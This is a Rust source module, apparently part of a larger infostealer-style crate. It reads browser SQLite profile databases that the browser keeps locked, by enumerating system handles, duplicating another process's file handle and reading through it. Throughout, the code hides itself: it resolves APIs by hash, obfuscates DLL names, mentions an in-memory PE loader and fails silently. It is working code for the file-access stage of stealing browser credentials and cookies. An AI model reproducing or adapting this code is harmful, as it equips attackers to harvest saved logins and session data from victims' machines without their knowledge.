//! Locked-file reading through another process's open handle.
//!
//! Browsers hold their SQLite profile databases under exclusive locks. Instead
//! of terminating the browser outright, this module enumerates system handles
//! (NtQuerySystemInformation/SystemHandleInformation), finds a handle to the
//! target file owned by another process, duplicates it into our process, and
//! reads the contents through the duplicate with positioned NtReadFile calls
//! (the source handle is typically opened for overlapped I/O).
//!
//! All Win32/NT calls go through hashed runtime resolution like the rest of
//! the crate. Every failure path returns None silently.

use std::collections::HashMap;
use std::ffi::c_void;
use std::path::Path;

use crate::resolve::resolve;

const SYSTEM_HANDLE_INFORMATION: u32 = 16;
const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
const STATUS_END_OF_FILE: i32 = 0xC0000011u32 as i32;
const STATUS_PENDING: i32 = 0x00000103;
const PROCESS_DUP_HANDLE: u32 = 0x40;
const DUPLICATE_SAME_ACCESS: u32 = 0x2;
const WAIT_OBJECT_0: u32 = 0;
const WAIT_TIMEOUT_MS: u32 = 5000;
const QUERY_BUF_MAX: usize = 16 * 1024 * 1024;
const READ_CHUNK: usize = 1024 * 1024;
const MAX_FILE_BYTES: u64 = 512 * 1024 * 1024;

/// FS_INFORMATION_CLASS FileFsDeviceInformation.
const FILE_FS_DEVICE_INFORMATION: u32 = 4;
/// FILE_DEVICE_* values that can hold a real on-disk file. Everything else
/// (named pipes, mailslots, console/pty, null, ...) is skipped before the
/// path query — GetFinalPathNameByHandleW can block in the kernel on those.
const FILE_DEVICE_CD_ROM: u32 = 0x2;
const FILE_DEVICE_DISK: u32 = 0x7;
const FILE_DEVICE_NETWORK_FILE_SYSTEM: u32 = 0x14;

/// GetCurrentProcess() pseudo-handle.
const CURRENT_PROCESS: *mut c_void = usize::MAX as *mut c_void;

/// SYSTEM_HANDLE_TABLE_ENTRY_INFO as returned by class 16
/// (SystemHandleInformation) — NOT the _EX variant from class 64.
/// x64 layout: 2+2+1+1+2, then PVOID aligned to 8, then ULONG → 24 bytes.
#[repr(C)]
#[derive(Clone, Copy)]
struct SystemHandleEntry {
    unique_process_id: u16,
    creator_back_trace_index: u16,
    object_type_index: u8,
    handle_attributes: u8,
    handle_value: u16,
    object: *mut c_void,
    granted_access: u32,
}

const _: () = assert!(std::mem::size_of::<SystemHandleEntry>() == 24);
const _: () = assert!(std::mem::offset_of!(SystemHandleEntry, object) == 8);
const _: () = assert!(std::mem::offset_of!(SystemHandleEntry, granted_access) == 16);

/// IO_STATUS_BLOCK; the Status/Pointer union rides in the first word.
#[repr(C)]
struct IoStatusBlock {
    status: isize,
    information: usize,
}

type NtQuerySystemInformationFn =
    unsafe extern "system" fn(u32, *mut c_void, u32, *mut u32) -> i32;
type NtReadFileFn = unsafe extern "system" fn(
    *mut c_void,
    *mut c_void,
    *mut c_void,
    *mut c_void,
    *mut IoStatusBlock,
    *mut c_void,
    u32,
    *mut i64,
    *mut u32,
) -> i32;
type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
type DuplicateHandleFn = unsafe extern "system" fn(
    *mut c_void,
    *mut c_void,
    *mut c_void,
    *mut *mut c_void,
    u32,
    i32,
    u32,
) -> i32;
type GetFinalPathNameByHandleWFn =
    unsafe extern "system" fn(*mut c_void, *mut u16, u32, u32) -> u32;
type NtQueryVolumeInformationFileFn = unsafe extern "system" fn(
    *mut c_void,
    *mut IoStatusBlock,
    *mut c_void,
    u32,
    u32,
) -> i32;
type GetFileSizeExFn = unsafe extern "system" fn(*mut c_void, *mut i64) -> i32;
type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
type CreateThreadFn = unsafe extern "system" fn(
    *mut c_void,
    usize,
    *mut c_void,
    *mut c_void,
    u32,
    *mut u32,
) -> *mut c_void;

struct Api {
    nt_query: NtQuerySystemInformationFn,
    nt_read: NtReadFileFn,
    nt_query_vol: NtQueryVolumeInformationFileFn,
    open_process: OpenProcessFn,
    dup_handle: DuplicateHandleFn,
    final_path: GetFinalPathNameByHandleWFn,
    file_size: GetFileSizeExFn,
    wait: WaitForSingleObjectFn,
    close: CloseHandleFn,
    create_thread: CreateThreadFn,
}

fn load_api() -> Option<Api> {
    unsafe {
        let addrs = [
            resolve(&crate::obf!("ntdll.dll"), crate::api!("NtQuerySystemInformation")),
            resolve(&crate::obf!("ntdll.dll"), crate::api!("NtReadFile")),
            resolve(&crate::obf!("ntdll.dll"), crate::api!("NtQueryVolumeInformationFile")),
            resolve("kernel32.dll", crate::api!("OpenProcess")),
            resolve("kernel32.dll", crate::api!("DuplicateHandle")),
            resolve("kernel32.dll", crate::api!("GetFinalPathNameByHandleW")),
            resolve("kernel32.dll", crate::api!("GetFileSizeEx")),
            resolve("kernel32.dll", crate::api!("WaitForSingleObject")),
            resolve("kernel32.dll", crate::api!("CloseHandle")),
            resolve("kernel32.dll", crate::api!("CreateThread")),
        ];
        if addrs.iter().any(|&a| a == 0) {
            return None;
        }
        Some(Api {
            nt_query: std::mem::transmute(addrs[0]),
            nt_read: std::mem::transmute(addrs[1]),
            nt_query_vol: std::mem::transmute(addrs[2]),
            open_process: std::mem::transmute(addrs[3]),
            dup_handle: std::mem::transmute(addrs[4]),
            final_path: std::mem::transmute(addrs[5]),
            file_size: std::mem::transmute(addrs[6]),
            wait: std::mem::transmute(addrs[7]),
            close: std::mem::transmute(addrs[8]),
            create_thread: std::mem::transmute(addrs[9]),
        })
    }
}

/// Growable-buffer query for the full system handle table.
unsafe fn query_system_handles(api: &Api) -> Option<Vec<u8>> {
    let mut cap: usize = 1 << 16;
    loop {
        let mut buf = vec![0u8; cap];
        let mut ret_len: u32 = 0;
        let status = (api.nt_query)(
            SYSTEM_HANDLE_INFORMATION,
            buf.as_mut_ptr() as *mut c_void,
            cap as u32,
            &mut ret_len,
        );
        if status == STATUS_INFO_LENGTH_MISMATCH {
            cap = cap.checked_mul(2)?;
            if cap > QUERY_BUF_MAX {
                return None;
            }
            continue;
        }
        if status < 0 {
            return None;
        }
        return Some(buf);
    }
}

/// Lowercase, with the `\\?\` / `\\?\UNC\` prefix stripped from
/// GetFinalPathNameByHandleW output so it can compare against a plain path.
fn normalize_path(p: &str) -> String {
    if let Some(rest) = p.strip_prefix("\\\\?\\UNC\\") {
        let mut s = String::with_capacity(rest.len() + 2);
        s.push_str("\\\\");
        s.push_str(rest);
        return s.to_lowercase();
    }
    p.strip_prefix("\\\\?\\").unwrap_or(p).to_lowercase()
}

/// GetFinalPathNameByHandleW is safe from the classic NtQueryObject pipe
/// deadlock in almost all cases, but in practice a duplicated pipe/pty handle
/// (observed on this dev box: Chromium Mojo pipes, MSYS ptys) can still block
/// the call in the kernel indefinitely. Two defenses, both in the worker:
/// a FileFsDeviceInformation prefilter keeps non-filesystem handles away from
/// the path query entirely, and the whole query runs on a worker thread with
/// a timeout; a stuck worker is abandoned (its dup handle is intentionally
/// leaked — the kernel call may complete at any time, so nothing it touches
/// may be reused or closed) and scanning continues on a fresh worker.
enum QueryOutcome {
    Done(Option<String>),
    Stuck,
}

type QueryReq = (usize, std::sync::mpsc::SyncSender<Option<String>>);

const QUERY_TIMEOUT_MS: u64 = 2000;
const DEV_WAIT_TIMEOUT_MS: u32 = 1000;
const MAX_ABANDONED_WORKERS: u32 = 16;
/// Total wall-clock budget for one read_via_handle_dup call; callers fall
/// back gracefully when it is exhausted.
const TOTAL_BUDGET: std::time::Duration = std::time::Duration::from_secs(20);

/// Combined device-type prefilter + path query, always run on a worker thread
/// under a timeout: both NT calls can block in the kernel on pathological
/// handles, and the scanner must survive that.
///
/// Returns Some(path) only for handles to real filesystem devices whose path
/// resolves; None means "not a candidate" (non-disk device, query failure, or
/// a pended device query that did not finish in time).
unsafe fn classify_and_query(
    handle: *mut c_void,
    nt_query_vol: NtQueryVolumeInformationFileFn,
    final_path: GetFinalPathNameByHandleWFn,
    wait: WaitForSingleObjectFn,
) -> Option<String> {
    // Heap-allocated: if the IRP pends and we time out waiting, the request
    // may still complete later and write into these — so on timeout the
    // allocation is deliberately leaked, never freed out from under the kernel.
    struct DevQuery {
        iosb: IoStatusBlock,
        dev: [u32; 2], // FILE_FS_DEVICE_INFORMATION { DeviceType, Characteristics }
    }
    let q = Box::into_raw(Box::new(DevQuery {
        iosb: std::mem::zeroed(),
        dev: [0; 2],
    }));
    let mut status = nt_query_vol(
        handle,
        &mut (*q).iosb,
        (*q).dev.as_mut_ptr() as *mut c_void,
        8,
        FILE_FS_DEVICE_INFORMATION,
    );
    if status == STATUS_PENDING {
        if wait(handle, DEV_WAIT_TIMEOUT_MS) != WAIT_OBJECT_0 {
            return None; // q leaked on purpose
        }
        status = (*q).iosb.status as i32;
    }
    let dev = (*q).dev;
    drop(Box::from_raw(q));
    if status < 0
        || !matches!(
            dev[0],
            FILE_DEVICE_CD_ROM | FILE_DEVICE_DISK | FILE_DEVICE_NETWORK_FILE_SYSTEM
        )
    {
        return None;
    }

    let mut wbuf = vec![0u16; 16384];
    let n = final_path(handle, wbuf.as_mut_ptr(), wbuf.len() as u32, 0);
    if n == 0 || n as usize >= wbuf.len() {
        return None;
    }
    Some(normalize_path(&String::from_utf16_lossy(
        &wbuf[..n as usize],
    )))
}

struct PathQuerier {
    req: Option<std::sync::mpsc::Sender<QueryReq>>,
    fn_addrs: [usize; 3],
    create_thread: CreateThreadFn,
    close: CloseHandleFn,
    abandoned: u32,
}

struct WorkerCtx {
    rx: std::sync::mpsc::Receiver<QueryReq>,
    fn_addrs: [usize; 3],
}

/// Raw CreateThread entry instead of std::thread::spawn: the in-memory PE
/// loader runs no OS thread bootstrap for us, and a plain kernel thread with
/// a catch_unwind guard is the smallest surface that provably works there.
extern "C" fn worker_entry(param: *mut c_void) -> u32 {
    let ctx = unsafe { Box::from_raw(param as *mut WorkerCtx) };
    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        let (nt_query_vol, final_path, wait) = unsafe {
            (
                std::mem::transmute::<usize, NtQueryVolumeInformationFileFn>(ctx.fn_addrs[0]),
                std::mem::transmute::<usize, GetFinalPathNameByHandleWFn>(ctx.fn_addrs[1]),
                std::mem::transmute::<usize, WaitForSingleObjectFn>(ctx.fn_addrs[2]),
            )
        };
        while let Ok((handle, resp)) = ctx.rx.recv() {
            let path = unsafe {
                classify_and_query(handle as *mut c_void, nt_query_vol, final_path, wait)
            };
            if resp.send(path).is_err() {
                // Scanner timed out and dropped the receiver; the request
                // channel is gone too, so just exit.
                return;
            }
        }
    }));
    0
}

impl PathQuerier {
    fn new(api: &Api) -> Self {
        PathQuerier {
            req: None,
            fn_addrs: [
                api.nt_query_vol as usize,
                api.final_path as usize,
                api.wait as usize,
            ],
            create_thread: api.create_thread,
            close: api.close,
            abandoned: 0,
        }
    }

    fn worker(&mut self) -> Option<&std::sync::mpsc::Sender<QueryReq>> {
        if self.req.is_none() {
            let (tx, rx) = std::sync::mpsc::channel::<QueryReq>();
            let ctx = Box::into_raw(Box::new(WorkerCtx {
                rx,
                fn_addrs: self.fn_addrs,
            }));
            let h = unsafe {
                (self.create_thread)(
                    std::ptr::null_mut(),
                    0,
                    worker_entry as *mut c_void,
                    ctx as *mut c_void,
                    0,
                    std::ptr::null_mut(),
                )
            };
            if h.is_null() {
                unsafe { drop(Box::from_raw(ctx)) };
                return None;
            }
            // Detached, like a dropped JoinHandle: the thread keeps running.
            unsafe { (self.close)(h) };
            self.req = Some(tx);
        }
        self.req.as_ref()
    }

    /// Query the final path of a duplicated handle. On timeout the handle is
    /// NOT closed (a stuck worker still owns the in-flight call) — it leaks.
    /// `timeout` is clamped to the remaining total budget by the caller.
    fn query(&mut self, dup: *mut c_void, timeout: std::time::Duration) -> QueryOutcome {
        let (rtx, rrx) = std::sync::mpsc::sync_channel(0);
        let send_failed = match self.worker() {
            Some(w) => w.send((dup as usize, rtx)).is_err(),
            None => true,
        };
        if send_failed {
            // Worker died before taking the handle (or could not be created);
            // it is unused and closable.
            self.req = None;
            return QueryOutcome::Done(None);
        }
        match rrx.recv_timeout(timeout) {
            Ok(path) => QueryOutcome::Done(path),
            Err(_) => {
                self.abandoned += 1;
                self.req = None;
                QueryOutcome::Stuck
            }
        }
    }
}

/// Read the whole file through the duplicated handle. The source handle is
/// typically opened FILE_FLAG_OVERLAPPED, so use positioned NtReadFile chunks;
/// an async completion shows up as STATUS_PENDING and is awaited on the file
/// handle itself (file objects are waitable) with a hard timeout.
unsafe fn read_all(api: &Api, handle: *mut c_void) -> Option<Vec<u8>> {
    let mut size: i64 = 0;
    let known_size = (api.file_size)(handle, &mut size) != 0 && size >= 0;
    if known_size && size as u64 > MAX_FILE_BYTES {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(if known_size { size as usize } else { READ_CHUNK });
    let mut chunk = vec![0u8; READ_CHUNK];
    let mut offset: i64 = 0;
    loop {
        let want = if known_size {
            let remaining = size - offset;
            if remaining <= 0 {
                break;
            }
            remaining.min(READ_CHUNK as i64) as u32
        } else {
            READ_CHUNK as u32
        };
        // Boxed: if the read pends and the wait below times out, the IRP can
        // still complete later and write into the iosb and chunk — both are
        // deliberately leaked on that path rather than freed under the kernel.
        let mut iosb: Box<IoStatusBlock> = Box::new(std::mem::zeroed());
        let mut status = (api.nt_read)(
            handle,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            iosb.as_mut(),
            chunk.as_mut_ptr() as *mut c_void,
            want,
            &mut offset,
            std::ptr::null_mut(),
        );
        if status == STATUS_PENDING {
            if (api.wait)(handle, WAIT_TIMEOUT_MS) != WAIT_OBJECT_0 {
                std::mem::forget(iosb);
                std::mem::forget(chunk);
                return None;
            }
            status = iosb.status as i32;
        }
        if status == STATUS_END_OF_FILE {
            break;
        }
        if status < 0 {
            return None;
        }
        let got = iosb.information.min(want as usize);
        out.extend_from_slice(&chunk[..got]);
        if got < want as usize {
            break;
        }
        offset += got as i64;
        if out.len() as u64 > MAX_FILE_BYTES {
            return None;
        }
    }
    Some(out)
}

unsafe fn scan_handles(
    api: &Api,
    buf: &[u8],
    own_pid: u32,
    target: &str,
    cache: &mut HashMap<u32, Option<*mut c_void>>,
    deadline: std::time::Instant,
) -> Option<Vec<u8>> {
    let base = buf.as_ptr();
    let count = std::ptr::read_unaligned(base as *const u32) as usize;
    let entry_size = std::mem::size_of::<SystemHandleEntry>();
    // SYSTEM_HANDLE_INFORMATION: ULONG NumberOfHandles, padded to 8 on x64.
    let avail = buf.len().saturating_sub(8) / entry_size;

    let mut querier = PathQuerier::new(api);

    for i in 0..count.min(avail) {
        // Total wall-clock budget: bail out silently before burning time on
        // another DuplicateHandle/worker dispatch.
        let remaining = deadline.saturating_duration_since(std::time::Instant::now());
        if remaining.is_zero() {
            return None;
        }
        let entry =
            std::ptr::read_unaligned(base.add(8 + i * entry_size) as *const SystemHandleEntry);
        let pid = entry.unique_process_id as u32;
        if pid == own_pid || pid == 0 || pid == 4 || entry.handle_value == 0 {
            continue;
        }
        let src_proc = match cache.entry(pid).or_insert_with(|| {
            let h = (api.open_process)(PROCESS_DUP_HANDLE, 0, pid);
            if h.is_null() {
                None
            } else {
                Some(h)
            }
        }) {
            Some(h) => *h,
            None => continue,
        };
        let mut dup: *mut c_void = std::ptr::null_mut();
        if (api.dup_handle)(
            src_proc,
            entry.handle_value as *mut c_void,
            CURRENT_PROCESS,
            &mut dup,
            0,
            0,
            DUPLICATE_SAME_ACCESS,
        ) == 0
        {
            continue;
        }
        let query_timeout =
            remaining.min(std::time::Duration::from_millis(QUERY_TIMEOUT_MS));
        match querier.query(dup, query_timeout) {
            QueryOutcome::Done(path) => {
                let matched = path.as_deref() == Some(target);
                if matched {
                    let data = read_all(api, dup);
                    (api.close)(dup);
                    if data.is_some() {
                        return data;
                    }
                } else {
                    (api.close)(dup);
                }
            }
            QueryOutcome::Stuck => {
                // dup intentionally leaked; a stuck worker owns the in-flight
                // query on it. Bail out entirely if pathological handles are
                // common on this machine.
                if querier.abandoned > MAX_ABANDONED_WORKERS {
                    return None;
                }
            }
        }
    }
    None
}

/// Read a locked file through another process's open handle. Returns None
/// (silently) if no readable handle to `want_path` exists anywhere.
pub fn read_via_handle_dup(want_path: &Path) -> Option<Vec<u8>> {
    let deadline = std::time::Instant::now() + TOTAL_BUDGET;
    let api = load_api()?;
    let target = normalize_path(&want_path.to_string_lossy());
    let buf = unsafe { query_system_handles(&api)? };
    let own_pid = std::process::id();
    let mut cache: HashMap<u32, Option<*mut c_void>> = HashMap::new();
    let result = unsafe { scan_handles(&api, &buf, own_pid, &target, &mut cache, deadline) };
    for (_, proc) in cache.into_iter() {
        if let Some(h) = proc {
            unsafe {
                (api.close)(h);
            }
        }
    }
    result
}
